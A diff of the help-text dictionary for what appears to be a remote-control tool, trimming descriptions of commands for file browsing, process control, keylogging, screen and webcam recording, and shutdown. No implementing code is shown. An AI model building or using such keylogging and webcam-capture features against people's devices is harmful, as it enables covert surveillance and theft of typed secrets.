@@ -6,7 +6,7 @@ def __help_df():
             'HELP': 'Show the command list of this application.',
         },
         'EXPLORER': {
-            'EXPLORER TREE <path>': 'Show the directory tree (1-level) of the <path>. If <path> is not given, the list of disks will be shown.',
+            'EXPLORER TREE <path>': 'Show the directory tree (1-level) of the <path>.',
             'EXPLORER COPY <source> <dest>': 'Copy the file or directory <source> to <dest>.',
             'EXPLORER MOVE <source> <dest>': 'Move the file or directory <source> to <dest>.',
             'EXPLORER DELETE <path>': 'Delete the file or directory <path>.',
@@ -23,15 +23,15 @@ def __help_df():
             'PROCESS close <ID>': 'Close the running process with the given ID.',
         },
         'KEYLOGGER': {
-            'KEYLOGGER get <duration>': 'Get the keylogger data of the device in <duration> seconds. If <duration> is not given, the default value is 10 seconds.',
+            'KEYLOGGER get <duration>': 'Get the keylogger data of the device in <duration> seconds.',
         },
         'SCREEN': {
             'SCREEN get image': 'Get the screenshot of the device.',
-            'SCREEN get video <duration>': 'Get the screen recording of the device in <duration> seconds. If <duration> is not given, the default value is 10 seconds.',
+            'SCREEN get video <duration>': 'Get the screen recording of the device in <duration> seconds.',
         },
         'WEBCAM': {
             'WEBCAM get image': 'Get the image from the webcam of the device.',
-            'WEBCAM get video <duration>': 'Get the video from the webcam of the device in <duration> seconds. If <duration> is not given, the default value is 10 seconds.',
+            'WEBCAM get video <duration>': 'Get the video from the webcam of the device in <duration> seconds.',
         },
         'PC': {
             'PC shutdown': 'Shut down the device.',
